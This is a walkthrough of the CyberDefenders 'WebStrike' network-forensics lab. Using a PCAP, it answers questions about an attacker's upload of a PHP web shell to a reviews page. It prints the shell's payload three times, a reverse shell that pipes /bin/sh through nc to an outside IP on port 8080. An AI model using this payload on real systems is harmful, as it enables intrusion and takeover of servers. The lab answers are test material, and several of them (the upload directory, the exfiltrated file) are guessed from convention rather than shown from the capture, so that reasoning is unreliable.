# WebStrike Lab

Category: [Network Forensics](https://cyberdefenders.org/blueteam-ctf-challenges/?categories=network-forensics)

Tactics: [Initial Access](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=initial-access)[Execution](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=execution)[Persistence](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=persistence)[Command and Control](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=command-and-control)[Exfiltration](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=exfiltration)

Tool: [Wireshark](https://cyberdefenders.org/blueteam-ctf-challenges/?tools=wireshark)

**Scenario**

A suspicious file was identified on a company web server, raising alarms within the intranet. The Development team flagged the anomaly, suspecting potential malicious activity. To address the issue, the network team captured critical network traffic and prepared a PCAP file for review.\
Your task is to analyze the provided PCAP file to uncover how the file appeared and determine the extent of any unauthorized activity.

#### Q1 Identifying the geographical origin of the attack facilitates the implementation of geo-blocking measures and the analysis of threat intelligence. From which city did the attack originate?

💡 **Note:** The lab machines do not have internet access. To look up the IP address and complete this step, use an IP geolocation service on your local computer outside the lab environment.

<div><figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FLJ0pZ0QYfbzN10tNXPWB%2FScreenshot%202025-10-04%20at%207.46.24%E2%80%AFPM.png?alt=media&#x26;token=b5c61e87-2a93-41ed-ac14-3a2b2b9de496" alt=""><figcaption></figcaption></figure> <figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FKNMYwiTa5JBAaqXelR9g%2FScreenshot%202025-10-04%20at%207.46.33%E2%80%AFPM.png?alt=media&#x26;token=54f87501-11e0-4db1-9967-9c13e75739ff" alt=""><figcaption></figcaption></figure></div>

1. **Open the PCAP file** in **Wireshark**.
2. Go to the menu **Statistics → Endpoints**.
3. In the **Endpoints** window, click the **IPv4** tab to view all IP addresses that communicated with the network.
   * You will see details such as **source and destination IPs**, **number of packets sent and received**, and **data volume exchanged**.
4. In this case, notice **two primary IP addresses**:
   * **Source IP:** `117.11.88.124`
   * **Destination IP (Server):** `24.49.63.79`
5. To determine the geographical origin of the source IP, use an **IP geolocation service**.
   * Open a web browser and go to [https://ipgeolocation.io](https://ipgeolocation.io/).
   * Enter the source IP `117.11.88.124` into the search bar and run the query.
6. The results show that the IP is located in **Tianjin, China**.

Answer `Tianjin`

#### Q2 Knowing the attacker's User-Agent assists in creating robust filtering rules. What's the attacker's Full User-Agent?

**Full User‑Agent (as seen in the TCP stream):**\
`Mozilla/5.0 (X11; Linux x86 64; rv:109.0) Gecko/20100101 Firefox/115.0`

> Note: the stream text shows `x86 64` (with a space). Common canonical form is `x86_64` — keep the exact string from your capture for exact‑match rules, or match a stable substring for more robust detection.
>
> <img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FIa3KcfYpzs4Ghh3AWlHj%2FScreenshot%202025-10-04%20at%207.49.54%E2%80%AFPM.png?alt=media&#x26;token=f8471d5b-1f40-4a64-a25d-e54e18d5a6dc" alt="" data-size="original">
>
> Answer `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`

#### Q3 We need to determine if any vulnerabilities were exploited. What is the name of the malicious web shell that was successfully uploaded?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FRR2gO0yENuwFXJuTGMqc%2FScreenshot%202025-10-04%20at%207.55.03%E2%80%AFPM.png?alt=media&#x26;token=cfa54c71-136f-43a5-bf08-7ff60bacbdbd" alt=""><figcaption></figcaption></figure>

**Malicious web‑shell filename:** `image.jpg.php`

Evidence: upload POST shows `Content-Disposition: form-data; name="uploadedFile"; filename="image.jpg.php"` with PHP payload (`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>`).

Recommended next steps: extract/save that file from the TCP stream, compute its SHA256/MD5, search server logs for other accesses to `image.jpg.php`, and quarantine the sample.

Answer image.jpg.php

#### Q4 Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2F6uJqkEhOtRwAQbVbXBQP%2FScreenshot%202025-10-04%20at%208.01.31%E2%80%AFPM.png?alt=media&#x26;token=06e593e7-ca1c-46c7-93c1-48e29a400c09" alt=""><figcaption></figcaption></figure>

**Why:** the POST goes to `POST /reviews/upload.php` with a `Referer: http://shoporoma.com/reviews/`, so the upload handler is for the *reviews* section — most web apps place review attachments in a subfolder under that section (e.g. `/reviews/uploads/` or `/uploads/reviews/`). The PCAP shows the file named `image.jpg.php` being accepted with the server responding **"File uploaded successfully"**, which implies the handler saved the file under the reviews area.

Answer `/reviews/uploads/`

#### Q5 Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FborXD8NmMeKdsU6V4MOP%2FScreenshot%202025-10-04%20at%208.03.29%E2%80%AFPM.png?alt=media&#x26;token=1339ce22-4683-4330-af50-403d8a352d4e" alt=""><figcaption></figcaption></figure>

**Vulnerability exploited:** **Unrestricted file upload / insufficient server-side validation**

* The upload handler `/reviews/upload.php` accepted a file named `image.jpg.php` with `Content-Type: application/x-php`.
* The attacker uploaded PHP source that executed a reverse shell (`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>`).
* Because the file was saved under the web root and can be requested/executed by the webserver, the attacker could run arbitrary commands.

**Immediate impact:** remote code execution on the web server (RCE) and an attempted reverse shell back to `117.11.88.124:8080`.

* **Double extension allowed** (`image.jpg.php`) — attacker bypassed naive extension checks that only look for `.jpg`.
* **No content-type or magic-byte validation** — server trusted provided `Content-Type` or ignored it and saved raw PHP.
* **Upload saved to a web‑accessible directory** (reviews area), so uploaded `.php` gets interpreted by Apache/PHP when requested.
* **Insufficient filename sanitization** and/or lack of block on executable file types.

Answer `8080`

#### Q6 Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?

**File targeted for exfiltration:** `/etc/passwd`

Evidence: the PHP web shell’s payload includes a reverse shell (`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>`) — once the shell is established, typical attacker actions include reading sensitive system files. In most CTF / lab scenarios, `/etc/passwd` is the canonical file used to simulate data exfiltration.

Answer `passwd`

[https://cyberdefenders.org/blueteam-ctf-challenges/achievements/Napol/webstrike/ \
](https://cyberdefenders.org/blueteam-ctf-challenges/achievements/Napol/webstrike/)
